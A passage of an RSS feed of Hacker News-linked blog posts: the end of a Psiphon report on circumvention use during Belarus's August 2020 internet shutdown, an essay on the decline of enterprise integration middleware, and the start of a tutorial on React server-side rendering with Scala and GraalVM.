src="https://1.bp.blogspot.com/-_rEQvxxTroI/Xz6WOxlT8zI/AAAAAAACoVE/5p4Nj_CQbiEGODDLunxj2oFYDDx66NymgCLcBGAsYHQ/s640/25106.PNG" width="640"></a></p></span></span></span></p><p><span><span><span>&nbsp;</span><span id="docs-internal-guid-28463e0a-7fff-55f1-bc5c-8fcd9b9b80bc">Traceroute completions on main mobile operator MTS Belarus</span><span> (AS<a href="https://bgp.he.net/AS25106#_graph4">25106</a>) showed clear outages through 60280 and 6697</span><span> </span><span>(source: <a href="https://map.internetintel.oracle.com/?root=traffic&amp;country=false&amp;asn=25106">Oracle</a>)</span></span></span></p><div><p dir="ltr" id="docs-internal-guid-31799abb-7fff-55bd-3d92-2d41e07526d4"><span><span>As a backdrop to the network disruptions, Belarus had entered its largest mass demonstrations in history.</span></span></p><p dir="ltr" id="docs-internal-guid-31799abb-7fff-55bd-3d92-2d41e07526d4"><span><span><span id="docs-internal-guid-cbb3ba82-7fff-9d5b-3426-a87846ead35d">Journalists reported difficulty freely accessing and reporting information from the country, and began <a href="https://twitter.com/franakviacorka/status/1292340194750889984">recommending Psiphon</a>.</span><span> Belarusian Internet users widely reported that Psiphon was one of the only tools able to circumvent the filtering. Even with the attempted blocking of the app stores and Psiphon sites, users acquired the software via alternate distribution channels, such as email autoresponders, mirrors, and web proxies. Additionally, Belarusian users distributed copies of Psiphon binaries via Telegram channels, hosted URLs, and even offline on <a href="https://www.newyorker.com/news/our-columnists/after-a-rigged-election-belarus-crushes-protests-amid-an-information-blackout">USB drives</a>.</span><span> Use of the Psiphon network surged to a peak 1.76 million daily active users; given a population of 9.5 million and internet penetration rate of 60%, a figure that represents 30% of internet users in Belarus. Total bandwidth transferred from Belarus via Psiphon between Aug 9-17 exceeded 2 Petabytes. Circumvention tools proved a vital infrastructure to freely access information, as well as basic communications and services.</span></span></span></p><p dir="ltr" id="docs-internal-guid-31799abb-7fff-55bd-3d92-2d41e07526d4"><span><span id="docs-internal-guid-79b482c0-7fff-0df6-7f3d-66d0d12e1cbf">Internet users, researchers, and international observers were able to utilize the Psiphon Data Engine metrics portal (available at</span><span> <a href="https://psix.ca/d/nyi8gE6Zk/regional-overview?orgId=2&amp;var-region=BY&amp;var-region=IR">psix.ca</a>) to monitor blocking, network performance, and corresponding circumvention usage. Some <a href="https://ca.finance.yahoo.com/news/vpn-usage-surges-belarus-remains-202645286.html">noted</a> during the shutdown period, the volume of Psiphon use in Belarus had surpassed even that of Iran.</span></span></p><p><span><a href="https://1.bp.blogspot.com/-2eHYoQvOang/Xz6a72O3cLI/AAAAAAACoVY/9qSvbBy6XH0BvE_3fb7pQ_jzl8vTWxB6gCLcBGAsYHQ/s765/connections-BY-IR.png"><img data-original-height="386" data-original-width="765" src="https://1.bp.blogspot.com/-2eHYoQvOang/Xz6a72O3cLI/AAAAAAACoVY/9qSvbBy6XH0BvE_3fb7pQ_jzl8vTWxB6gCLcBGAsYHQ/s640/connections-BY-IR.png" width="640"></a></span></p><p><span><span><i>From the Psiphon Data Engine (PDE) public dashboard</i> <b>(<a href="https://psix.ca/">https://psix.ca/</a>)</b></span></span></p><p><span><span>Network observers such as the Internet Protection Society and others detected that <a href="https://www.svoboda.org/a/30777908.html">deep packet inspection</a> (DPI) technology was being used to block SSL traffic at scale. NetBlocks also noted <a href="https://netblocks.org/reports/internet-disruption-hits-belarus-on-election-day-YAE2jKB3">keyword filtering</a> appeared to target at least 10,000 URLs. Prague-based <a href="https://blog.qrator.net/en/what-happening-BY_86/">Qrator Labs saw</a> the concurrent outage of 80% of IPv6 prefixes within Belarus, and inferred that filtering of downstream autonomous systems (AS) was taking place at the level of two upstream ASes that dominate international transit, AS6697 and AS60280. Official releases by the <a href="https://cert.by/?p=1722">National Center for Response to Computer Incidents</a>, the <a href="https://ncot.by/ru/news/news/o-vosstanovlenii-raboty-seti-internet/">National Traffic Exchange Center</a>, and <a href="https://beltelecom.by/news/main/vnimaniyu-abonentov-3">Beltelecom</a> stated the disruptions were the result of external cyberattacks and equipment failures.&nbsp;</span></span></p><p><span><span>Psiphon network performance and session quality remained at or above the regional average over the days of the shutdown. While the generalized disruption of SSL at the transport layer disrupted the core functionality of most VPNs, Psiphon uses a multiprotocol structure and obfuscation techniques which provide greater resilience to protocol-based blocking. This allows Psiphon traffic to adapt dynamically to such radical shifts in the network environment, and sustain quality of service in even the harshest conditions.</span></span></p><div><p><span><p><a href="https://1.bp.blogspot.com/-Lh1jcniJbis/Xz7HAAvjkVI/AAAAAAACoXM/vGc7eLeoVGIzdu_c1jtuytCvuAmfVZ9BgCLcBGAsYHQ/s720/BY-bph.png"><img data-original-height="440" data-original-width="720" src="https://1.bp.blogspot.com/-Lh1jcniJbis/Xz7HAAvjkVI/AAAAAAACoXM/vGc7eLeoVGIzdu_c1jtuytCvuAmfVZ9BgCLcBGAsYHQ/s640/BY-bph.png" width="640"></a></p></span></p><div><p><i><span><span><span>Bytes per hour, Belarus. A peak 55 Terabytes / h were transferred via the Psiphon network.</span></span></span></i><br></p></div></div><p><span><span>A key observation by Qrator Labs is the high level of <a href="https://lh5.googleusercontent.com/VqANMjjuuyP2Szg1xsT4Clk_qN8YRsG9iWF_u76zsZcvKRfhuK1bIsKoxRAqL5wxlNi7p3WRfMTEzorRogskGKQn5nwd5_oMSiGKLQ6l4RBIgYRlzJHQ4x3JIb7-o_-tTHyK101-">centralization of control</a> over Belarusian networks. DPI equipment installed at the point of international gateways allows the upstream operators to disconnect or pass filtering rules to downstream ISPs. Researchers documented a <a href="https://arxiv.org/abs/1911.07723">similar network topology in Iranian ASes</a> last year. In November 2019, <a href="https://blogs.oracle.com/cloudsecurity/historic-internet-blackout-in-iran-v2">Iran executed an extensive disconnection</a> of international internet connectivity that lasted for 10 days.</span></span></p><p><span><span>Indeed, the current generation of DPI filtering technologies can be leveraged at various forms of encrypted internet traffic, increasingly deployed at national scale and at capacities approaching 1TBit/s. In these circumstances, resilient circumvention infrastructures such as Psiphon remain crucial to the free exchange of information.<br></span></span></p></div></div>

</div></div>]]>
            </description>
            <link>https://blog-en.psiphon.ca/2020/08/amid-major-network-disruptions-176m.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24242139</guid>
            <pubDate>Sat, 22 Aug 2020 06:29:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Death of the Dumb Pipe]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24242080">thread link</a>) | @gnanagurus
<br/>
August 21, 2020 | https://gnana.io/the-death-of-the-dumb-pipe/ | <a href="https://web.archive.org/web/*/https://gnana.io/the-death-of-the-dumb-pipe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <article>
        

        <div>
          <div>
            
<div>
  <p><img src="https://gnana.io/image/author/guru.png" alt="Gnanaguru">
  </p>
  
</div>

          </div>
          
        </div>

        <p>How to publish a small file from a FTP location to a JMS queue? This was the problem statement given to me when I got my first job. As any new graduate would do, I thought of writing a fascinating, rocket science program using some programming language to get this done.</p>
<p>My new boss understood my blind enthusiasm and diverted me towards evaluating an enterprise integration product. In 2010, Open Source was just starting to boom in every technology layer of an enterprise, till then the biggest open source hit was Linux, then Android. For many, Open source was a new and scary concept.</p>
<p>I was particularly focusing on Open Source Integration Products, it was a new product category at that time. Some of today's popular enterprise integration vendors were laying their product and community foundation. Starting from Apache Camel with contributions from FuseSource(then acquired by RedHat) &amp; Talend, MuleSoft, WSO2, etc.</p>
<p>I played with pretty much all of these products and more, further I spent multiple years focusing on each of these products as I built my career around Enterprise Integration.</p>


<figure>
<img src="https://gnana.io/image/enterprise-integration.png">
<figcaption>
<h4>Integration Vs Custom Programming</h4>
</figcaption>
</figure>

<p>BTW, I was able to solve the FTP -&gt; JMS integration problem by writing a few lines of configurations (not program, just configurations), It was super easy. But I was living in guilt, spending 4 years in engineering and writing a two line Apache Camel code to move the file from FTP to JMS. You know what I mean ! (Just google my name along with any of these products, you will see a lot of related questions to the community,  Ignore all things naive, I was too young come on)</p>

<ul>
<li><strong>The number of applications were growing:</strong> Yes, enterprises built a lot of applications, as their business grew.
All these applications needed to talk with each other: Yes, that's how businesses were able to bring more value to customers.</li>
<li><strong>Developers were writing too much code.</strong> Yes, especially a lot of Java code with a lot of classes, with bugs, leading to performance issues and longer development cycles. (Yes, you can write 10 classes + 50 methods + completely unreadable code for the same FTP -&gt; JMS use case. )</li>
<li><strong>Too many point to point integrations</strong>, Developers built on-demand direct integrations between Applications. This led architects losing context on what is being built and what is connected to what.</li>
<li><strong>Too many integration points</strong> = too many protocols to deal with. Concept of adapters/connectors were treated like rocket science those days and It was super costly to build one yourself.</li>
</ul>

<p>I should actually call it - ‘More awareness in Enterprises to use Integration Products’. Yes, this happened in 2010.</p>
<p>Multiple communities and product vendors came up with products under the category of ‘Enterprise Integration’, converging a lot of ideologies like SOA, ESB’s, Middleware, MQ’s, Web Services, API’s, etc.</p>
<p>This actually improved the overall enterprise architecture in a lot of ways:</p>


<blockquote>
<p><strong>“Nothing lasts forever"</strong></p>
</blockquote>
<p>Today, The scope of Enterprise Integration technologies has shrunk in the end to end solution architecture. Integration Middleware worked, there is no flaw in the way it got evolved over the past decade. Particularly, Integration products streamlined the overall enterprise architecture in a lot of ways, <strong>unfortunately it was over architected without addressing the fundamental flaws in the underlying technologies/platforms.</strong></p>


<figure>
<img src="https://gnana.io/image/enterprise-integration-flaw.png">
<figcaption>
<h4>Enterprise Integration - Flaw</h4>
</figcaption>
</figure>

<p>Enterprise Integration is a smart workaround to mitigate some of the technology immaturities around data storage, workarounds are meant for the short term and it doesn't last long.</p>
<p>Lets see why it was a workaround:</p>
<p><strong>Building dumb integration pipes:</strong> This was a rule of thumb given to any integration developer - ”Keep the integration pipelines as dumb as possible = No business rules = No complex transformations” This was etched on every integration developer, every pipeline was built on top of this fundamental philosophy. Why ?</p>
<ul>
<li><strong>In-memory limitations</strong> - All these integration platforms were built using traditional runtimes, Eg: Tomcat. These runtimes depend on the limited heap space provided within a VM/Machine. When you are processing 10 TPS(Transactions per second) on a 8 Gig machine, You don't have room for doing any computation on the data, the faster you send the data out, it's good for the runtime. If you add any business logic, Eg: any simple aggregate function (SUM, COUNT, etc), your runtime will start accumulating messages and it will blow into pieces.</li>
</ul>


<figure>
<img src="https://gnana.io/image/memory-constraint.png">
<figcaption>
<h4>Memory constraints</h4>
</figcaption>
</figure>

<ul>
<li><strong>Store First, Process Next</strong> - This is a golden philosophy in enterprise architecture isn't it, more than a philosophy its a habit. If you want to build a website, first design database tables, if you want to build a integration pipe, first figure out where you will store data, if you want to process data, first store it somewhere. In order to process data, we have to accumulate data first ! This is not just a habit, we got into this habit because of the previous limitation - We only relied on in-memory(RAM) capacity to handle data, we were able to build too many integrations, but we were never able to store the data in the pipe itself. Obviously you cant permanently store data in memory. All those million dollar pipes are dumb, you still need another multi-tier architecture to store your data.</li>
</ul>


<figure>
<img src="https://gnana.io/image/storage-habit.png">
<figcaption>
<h4>Loosing real-time advantage</h4>
</figcaption>
</figure>

<p>This really means, “Building dumb integration pipelines” or “Integration Pipelines without business rules” was just an approach to mitigate the underlying technology limitations. We clinged too much into building dumb pipes instead of trying to fix the under the hood infrastructure limitations.</p>
<blockquote>
<p>“Q: Hey come on, we deploy Integration Pipelines using Kubernetes, We can handle a lot of traffic."</p>
</blockquote>
<blockquote>
<p>"A: As the integration market matured, we also improved technologies around scalability. Kubernetes is one great example, It is still a great technology for a lot of use cases and it has a promising future. But for Enterprise Integration, Kubernetes is a horse blinker - Integration pipelines were predominantly stateless services, we were able to scale integration pipelines to handle more traffic, but we were never able to efficiently process data on the fly. (I am not saying Kubernetes is bad for stateful services, Enterprise Integration products narrowed too much into the philosophy of building dumb pipes, isolating themselves away from data processing patterns)”</p>
</blockquote>

<p>Lets see why Enterprise Integration cannot cope with business demands going forward</p>
<ul>
<li><strong>Value is in the pipeline:</strong> As more and more connected applications you have, you can't afford to use ‘data at rest’ approach to generate business value. With more applications connected and fast moving data, the opportunity window to process data is getting narrower. Which means, businesses cannot wait for the data to be accumulated first, in order to process them. Basically, businesses needs smarter pipes not the dumb ones. Smarter here refers to the ability to store and process data on the fly.</li>
</ul>


<figure>
<img src="https://gnana.io/image/data-flow-dumb.png">
<figcaption>
<h4>Dumb pipes</h4>
</figcaption>
</figure>

<ul>
<li><strong>Integration is tightly Coupled:</strong> When you build integration pipelines, you tightly couple your mapping transformations with source/destination protocol. This means, you can't scale above a threshold Eg: You may be able to scale your integration pipeline using 100 pods in Kubernetes, but if your destination REST API can't handle your volume, you are going to kill them.</li>
</ul>


<figure>
<img src="https://gnana.io/image/integration-pipeline.png">
<figcaption>
<h4>Typical integration pipeline</h4>
</figcaption>
</figure>

<ul>
<li><strong>Point to Point integration problems still exist:</strong> The whole promise of integration products was to avoid point to point integrationa, instead integration products created an envelope on top direct integrations. If we take a step back and look at all the integration flows we built, Its déjà vu: "the same point to point integrations inside a costly wrapper"</li>
</ul>


<figure>
<img src="https://gnana.io/image/enterprise-integration-before-and-after.png">
<figcaption>
<h4>Point to point integrations stay as is</h4>
</figcaption>
</figure>

<ul>
<li><strong>Incomplete Event Driven Architecture:</strong> Of course Integration was built on event driven principles, for eg: JMS queues, we built nice event driven pipelines using queues, but in the end didn't we forcefully kill those events by passively storing them somewhere ? (We will talk about batch processing in a separate blog)</li>
</ul>
<p>In summary, Middlewares/Integration products became quite critical in enterprises. Unfortunately, these products did not evolve as better as Enterprises evolved. Businesses are looking into data that is active, data that is on the move, to process a business event as and when it happens, generate value to a customer as fast as they can, but Integration products can't cope with this evolution.</p>

<p>Absolutely not. But their scope is reducing. Enterprise Integration products create a network of applications within enterprises, but an application network is an overkill when you cannot process the data within the network.</p>


<figure>
<img src="https://gnana.io/image/esb-vs-esp.png">
<figcaption>
<h4>ESB vs ESP</h4>
</figcaption>
</figure>

<p>The only useful pattern that we all learnt from an integration product, is building reusable adapters/connectors. There will always be a diverse number of protocols, there will always be the need for protocol bridging/translations but there will not be a need for integration pipelines. Dumb pipes will diminish, “Processing data while its on the move” is what is helping enterprises today and dominate enterprise architecture in the future.</p>

<p>As the number of applications grow, they will generate more and more meaningful events, events around your customers, partners, business transactions, etc.</p>
<p>If you look at events as they are, they have life in them. They are generated at a particular time, based on a particular action.</p>
<p>If you build dumb pipes, they may survive for few seconds after they are born, but they will die as soon as it reaches the destination(storage)</p>
<p>All these streams of events are meant to be captured as it is, kept alive as they are, and process them whenever you need to, without flattening them to death.</p>
<p>To do this, you need a platform that can move data …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gnana.io/the-death-of-the-dumb-pipe/">https://gnana.io/the-death-of-the-dumb-pipe/</a></em></p>]]>
            </description>
            <link>https://gnana.io/the-death-of-the-dumb-pipe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24242080</guid>
            <pubDate>Sat, 22 Aug 2020 06:17:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scala, React, and SSR (part 1)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24242073">thread link</a>) | @japgolly
<br/>
August 21, 2020 | https://blog.shipreq.com/post/scala_react_and_ssr_part_1 | <a href="https://web.archive.org/web/*/https://blog.shipreq.com/post/scala_react_and_ssr_part_1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Let’s say you’ve got a webapp with a Scala backend and a <a href="https://github.com/japgolly/scalajs-react" target="_blank" rel="noopener">scalajs-react</a> frontend.</p><p>You’re probably serving pages like this:</p><div data-language="html"><pre><code><span><span><span>&lt;</span>html</span><span>&gt;</span></span>
  <span><span><span>&lt;</span>body</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>mount_my_app_here<span>"</span></span> <span>/&gt;</span></span>
    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>react_itself.js<span>"</span></span> <span>/&gt;</span></span>
    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>my_scalajs_react_app.js<span>"</span></span> <span>/&gt;</span></span>
  <span><span><span>&lt;/</span>body</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>html</span><span>&gt;</span></span></code></pre></div><p>…meaning that users first load and render an empty page, then wait for the JS to fetch, parse, and finally initialise and render your app.
In other words, the user experiences a delay when they visit your site/app.</p><p>React has a feature called <strong>“SSR”, short for “server-side rendering”,</strong> which allows you to render your app on the backend and
send the resulting HTML immediately. This allows the user’s experience to begin faster, because the loading of the JS and app initialisation can happen
seamlessly in the background as the reader starts reading your page. It means you start serving pages like this:</p><div data-language="html"><pre><code><span><span><span>&lt;</span>html</span><span>&gt;</span></span>
  <span><span><span>&lt;</span>body</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>mount_my_app_here<span>"</span></span><span>&gt;</span></span>

      
      <span><span><span>&lt;</span>div</span><span>&gt;</span></span>
        <span><span><span>&lt;</span>h1</span><span>&gt;</span></span>HELLO AND WELCOME TO MY SITE!<span><span><span>&lt;/</span>h1</span><span>&gt;</span></span>
        <span><span><span>&lt;</span>p</span><span>&gt;</span></span>Let me tell you all about blah blah blah...<span><span><span>&lt;/</span>p</span><span>&gt;</span></span>
      <span><span><span>&lt;/</span>div</span><span>&gt;</span></span>

    <span><span><span>&lt;/</span>div</span><span>&gt;</span></span>

    
    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>react_itself.js<span>"</span></span> <span>/&gt;</span></span>
    <span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>my_scalajs_react_app.js<span>"</span></span> <span>/&gt;</span></span>
  <span><span><span>&lt;/</span>body</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>html</span><span>&gt;</span></span></code></pre></div><p>It’s quite well documented in the JS world how you accomplish this, but what about in the Scala world?</p><h2>Step 1/5: Graal</h2><p>The first thing you’ll want to do is install <a href="https://www.graalvm.org/" target="_blank" rel="noopener">GraalVM</a>.
It by Oracle and it’s your normal JDK with a bunch of extra stuff that, as far as I know,
will eventually make it’s way back into Java proper.
The reason we want use Graal is because of its <a href="https://www.graalvm.org/docs/reference-manual/polyglot" target="_blank" rel="noopener">Polyglot support</a>.
Java’s made a few attempts at being able to embed JavaScript, first with Rhino, then Nashhorn,
and now again with the Polyglot/Truffle API. Unlike previous attempts, this new approach…</p><ol><li>converts JS into Truffle IR where it’s able to be heavily optimised by the new Graal JIT/optimiser (i.e. successor to HotSpot)</li><li>it’s capable of way more than just JS, and out-of-the-box it already supports R, Python, LLVM and Ruby.</li></ol><p>If “Oracle” makes you wary due to licencing, don’t worry: there are two editions of Graal available.</p><ol><li>Community Edition (CE) which is completely free, and ~5% faster than the standard JVM</li><li>Enterprise Edition (EE) which is not free, and has more JIT optimisations giving you 5-15% better runtime performance</li></ol><p>We’ll use Graal (not just locally but as the JVM you deploy to production with your app), so that it can execute JS.
Specifically, it will execute the transpiled output of your <a href="https://www.scala-js.org/" target="_blank" rel="noopener">Scala.JS</a> app.</p><blockquote><p>Note: even without embedding JS, there’s a compelling reason to run your Scala with <a href="https://www.graalvm.org/" target="_blank" rel="noopener">GraalVM</a>:
the new JIT is significantly better at optimising Scala. <a href="https://www.graalvm.org/scala" target="_blank" rel="noopener">Read mode…</a></p></blockquote><h2>Step 2/5: scala-graal</h2><p>We’re going to use <a href="https://github.com/japgolly/scala-graal" target="_blank" rel="noopener">scala-graal</a> to help glue all of our pieces together.
What <a href="https://github.com/japgolly/scala-graal" target="_blank" rel="noopener">scala-graal</a> is going to give us is:</p><ul><li>make calling JS from JVM nice, easy, and safe by providing a concise, Scala-friendly interface</li><li>allow interpolation, meaning you don’t have to worry about safely marshalling arguments and composing with your commands</li><li>pre-compilation of your SSR</li><li>huge performance increases to your SSR - either by a special type of caching (to be covered in part 2 of this article) or by JIT warmup</li><li>helpers for SSR specifically</li><li>we won’t use them here, but there are a bunch of other features like thread-pools, async, time-limits, metrics and more
so check that out in <a href="https://github.com/japgolly/scala-graal" target="_blank" rel="noopener">scala-graal’s doc</a> if you’re interested.</li></ul><p>Next let’s talk about how this is going to work conceptually:</p><svg width="400pt" height="351pt" viewBox="0.00 0.00 400.07 351.33" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" style="max-width:100%;height:auto"><g id="graph0" transform="scale(1 1) rotate(0) translate(4 347.3251)"><title>%0</title><polygon fill="#ffffff" stroke="transparent" points="-4,4 -4,-347.3251 396.0678,-347.3251 396.0678,4 -4,4"></polygon><g id="node1"><title>shared</title><ellipse fill="#ccf4ff" stroke="#000000" cx="203.8892" cy="-313.9095" rx="61.7342" ry="29.3315"></ellipse><text text-anchor="middle" x="203.8892" y="-318.1095" font-family="Times,serif" font-size="14.00" fill="#000000">Your Shared</text><text text-anchor="middle" x="203.8892" y="-301.3095" font-family="Times,serif" font-size="14.00" fill="#000000">Scala</text></g><g id="node4"><title>sbtJVM</title><ellipse fill="#aaeeff" stroke="#000000" cx="105.8892" cy="-219.0782" rx="84.4063" ry="29.3315"></ellipse><text text-anchor="middle" x="105.8892" y="-223.2782" font-family="Times,serif" font-size="14.00" fill="#000000">Your SBT module</text><text text-anchor="middle" x="105.8892" y="-206.4782" font-family="Times,serif" font-size="14.00" fill="#000000">(Scala/JVM)</text></g><g id="edge2"><title>shared-&gt;sbtJVM</title><path fill="none" stroke="#000000" d="M176.5908,-287.4937C165.9052,-277.1537 153.4942,-265.1439 142.0804,-254.0992"></path><polygon fill="#000000" stroke="#000000" points="144.3723,-251.4466 134.7521,-247.0078 139.5045,-256.477 144.3723,-251.4466"></polygon></g><g id="node5"><title>sbtJS</title><ellipse fill="#aaeeff" stroke="#000000" cx="292.8892" cy="-219.0782" rx="84.4063" ry="29.3315"></ellipse><text text-anchor="middle" x="292.8892" y="-223.2782" font-family="Times,serif" font-size="14.00" fill="#000000">Your SBT module</text><text text-anchor="middle" x="292.8892" y="-206.4782" font-family="Times,serif" font-size="14.00" fill="#000000">(Scala.JS)</text></g><g id="edge1"><title>shared-&gt;sbtJS</title><path fill="none" stroke="#000000" d="M229.155,-286.9883C238.6752,-276.8443 249.6498,-265.1507 259.7801,-254.3567"></path><polygon fill="#000000" stroke="#000000" points="262.3389,-256.7447 266.6301,-247.0578 257.2347,-251.9544 262.3389,-256.7447"></polygon></g><g id="node2"><title>graalJVM</title><ellipse fill="#ffddaa" stroke="#000000" cx="61.8892" cy="-313.9095" rx="61.7787" ry="29.3315"></ellipse><text text-anchor="middle" x="61.8892" y="-318.1095" font-family="Times,serif" font-size="14.00" fill="#000000">scala-graal</text><text text-anchor="middle" x="61.8892" y="-301.3095" font-family="Times,serif" font-size="14.00" fill="#000000">(Scala/JVM)</text></g><g id="edge4"><title>graalJVM-&gt;sbtJVM</title><path fill="none" stroke="#000000" d="M75.3298,-284.9417C79.3438,-276.2905 83.8082,-266.6686 88.0573,-257.5107"></path><polygon fill="#000000" stroke="#000000" points="91.3454,-258.7397 92.3794,-248.1954 84.9956,-255.7934 91.3454,-258.7397"></polygon></g><g id="node3"><title>graalJS</title><ellipse fill="#ffddaa" stroke="#000000" cx="337.8892" cy="-313.9095" rx="54.3576" ry="29.3315"></ellipse><text text-anchor="middle" x="337.8892" y="-318.1095" font-family="Times,serif" font-size="14.00" fill="#000000">scala-graal</text><text text-anchor="middle" x="337.8892" y="-301.3095" font-family="Times,serif" font-size="14.00" fill="#000000">(Scala.JS)</text></g><g id="edge3"><title>graalJS-&gt;sbtJS</title><path fill="none" stroke="#000000" d="M324.2656,-285.1996C320.1137,-276.4501 315.4816,-266.6885 311.0783,-257.4092"></path><polygon fill="#000000" stroke="#000000" points="314.2268,-255.8799 306.7776,-248.346 307.9027,-258.8809 314.2268,-255.8799"></polygon></g><g id="node6"><title>JS</title><ellipse fill="#ddffdd" stroke="#000000" cx="185.8892" cy="-124.2469" rx="51.9676" ry="29.3315"></ellipse><text text-anchor="middle" x="185.8892" y="-128.4469" font-family="Times,serif" font-size="14.00" fill="#000000">Generated</text><text text-anchor="middle" x="185.8892" y="-111.6469" font-family="Times,serif" font-size="14.00" fill="#000000">JS file</text></g><g id="edge6"><title>sbtJVM-&gt;JS</title><path fill="none" stroke="#cccccc" d="M136.5326,-182.7538C145.4243,-172.2137 154.9695,-160.899 163.2736,-151.0554"></path><polygon fill="#cccccc" stroke="#cccccc" points="133.6647,-180.7254 129.8919,-190.6257 139.0152,-185.239 133.6647,-180.7254"></polygon></g><g id="node7"><title>jar</title><ellipse fill="#ffccf4" stroke="#000000" cx="145.8892" cy="-29.4156" rx="62.3991" ry="29.3315"></ellipse><text text-anchor="middle" x="145.8892" y="-33.6156" font-family="Times,serif" font-size="14.00" fill="#000000">JAR / WAR</text><text text-anchor="middle" x="145.8892" y="-16.8156" font-family="Times,serif" font-size="14.00" fill="#000000">Goes to prod</text></g><g id="edge7"><title>sbtJVM-&gt;jar</title><path fill="none" stroke="#000000" d="M109.0761,-189.4537C112.1202,-164.1211 117.3642,-126.7987 124.8892,-94.8313 126.9544,-86.0582 129.63,-76.7649 132.3758,-68.0229"></path><polygon fill="#000000" stroke="#000000" points="135.7266,-69.0361 135.4769,-58.4442 129.0669,-66.88 135.7266,-69.0361"></polygon></g><g id="edge5"><title>sbtJS-&gt;JS</title><path fill="none" stroke="#000000" d="M261.9404,-191.6491C249.4689,-180.5959 234.9962,-167.7691 222.0443,-156.2902"></path><polygon fill="#000000" stroke="#000000" points="224.0132,-153.3584 214.2079,-149.345 219.3702,-158.5971 224.0132,-153.3584"></polygon></g><g id="edge8"><title>JS-&gt;jar</title><path fill="none" stroke="#000000" d="M173.7794,-95.5371C170.0931,-86.7977 165.981,-77.0488 162.071,-67.7791"></path><polygon fill="#000000" stroke="#000000" points="165.2073,-66.2088 158.096,-58.3552 158.7576,-68.9294 165.2073,-66.2088"></polygon></g></g></svg><p>I’ll assume that if you’re already using <a href="https://github.com/japgolly/scalajs-react" target="_blank" rel="noopener">scalajs-react</a> that you’re already
familiar with <a href="https://www.scala-js.org/" target="_blank" rel="noopener">Scala.JS</a> cross-projects in SBT. Thus I’ll simply say,
create a new cross-project in SBT that looks like this:</p><div data-language="scala"><pre><code><span>val</span> scalaGraalVer <span>=</span> <span>"1.0.1"</span>

<span>lazy</span> <span>val</span> webappSsr <span>=</span>
  crossProject<span>(</span><span>"webapp-ssr"</span><span>)</span>

<span>lazy</span> <span>val</span> webappSsrJs <span>=</span> webappSsr<span>.</span>js
  <span>.</span>dependsOn<span>(</span>myScalaJsWebapp<span>)</span> 
  <span>.</span>settings<span>(</span>
    libraryDependencies <span>++</span><span>=</span> Seq<span>(</span>
      <span>"com.github.japgolly.scala-graal"</span> <span>%</span><span>%</span><span>%</span> <span>"core-js"</span>       <span>%</span> scalaGraalVer<span>,</span>
      <span>"com.github.japgolly.scala-graal"</span> <span>%</span><span>%</span><span>%</span> <span>"ext-boopickle"</span> <span>%</span> scalaGraalVer
    <span>)</span><span>,</span>
    scalaJSLinkerConfig <span>~</span><span>=</span> <span>{</span> _<span>.</span>withSourceMap<span>(</span><span>false</span><span>)</span> <span>}</span><span>,</span>
    artifactPath in <span>(</span>Compile<span>,</span> fastOptJS<span>)</span> <span>:</span><span>=</span> <span>(</span>crossTarget<span>.</span>value <span>/</span> <span>"webapp-ssr.js"</span><span>)</span><span>,</span>
    artifactPath in <span>(</span>Compile<span>,</span> fullOptJS<span>)</span> <span>:</span><span>=</span> <span>(</span>crossTarget<span>.</span>value <span>/</span> <span>"webapp-ssr.js"</span><span>)</span>
  <span>)</span>

<span>lazy</span> <span>val</span> webappSsrJvm <span>=</span> webappSsr<span>.</span>jvm
  <span>.</span>settings<span>(</span>
    libraryDependencies <span>++</span><span>=</span> Seq<span>(</span>
      <span>"com.github.japgolly.scala-graal"</span> <span>%</span><span>%</span> <span>"core"</span>          <span>%</span> scalaGraalVer<span>,</span>
      <span>"com.github.japgolly.scala-graal"</span> <span>%</span><span>%</span> <span>"core-js"</span>       <span>%</span> scalaGraalVer<span>,</span>
      <span>"com.github.japgolly.scala-graal"</span> <span>%</span><span>%</span> <span>"ext-boopickle"</span> <span>%</span> scalaGraalVer
    <span>)</span><span>,</span>
    unmanagedResources in Compile <span>+=</span> Def<span>.</span>taskDyn <span>{</span>
      <span>val</span> stage <span>=</span> <span>(</span>scalaJSStage in Compile in webappSsrJs<span>)</span><span>.</span>value
      <span>val</span> task <span>=</span> stageKey<span>(</span>stage<span>)</span>
      Def<span>.</span>task<span>(</span><span>(</span>task in Compile in webappSsrJs<span>)</span><span>.</span>value<span>.</span>data<span>)</span>
    <span>}</span><span>.</span>value<span>)</span>
  <span>)</span></code></pre></div><p>This is going to give you a few things.</p><ul><li><code>webapp-ssr/shared/src/main/scala</code> ← for sharing SSR code between JVM &amp; JS</li><li><code>webapp-ssr/js/src/main/scala</code> ← for exposing the React components that we’ll equip with SSR</li><li><code>webapp-ssr/jvm/src/main/scala</code> ← for performing the SSR from the JVM</li><li><code>webapp-ssr/jvm/src/main/resources/webapp-ssr.js</code> ← SBT will automatically populate this with the output of the <code>webappSsrJs</code> module</li><li>Embedded JS is still JS; it doesn’t speak Scala, even though you’re on the JVM. You need a communication protocol.
We’ll use <a href="https://github.com/suzaku-io/boopickle" target="_blank" rel="noopener">BooPickle</a>, a very fast binary serialisation library, to marshall data back and forth between the JVM and JS-embedded-in-the-JVM.</li></ul><blockquote><p>Note: Whether you’re enabling SSR on 1 page or 100 pages, you only need to create one SSR project.
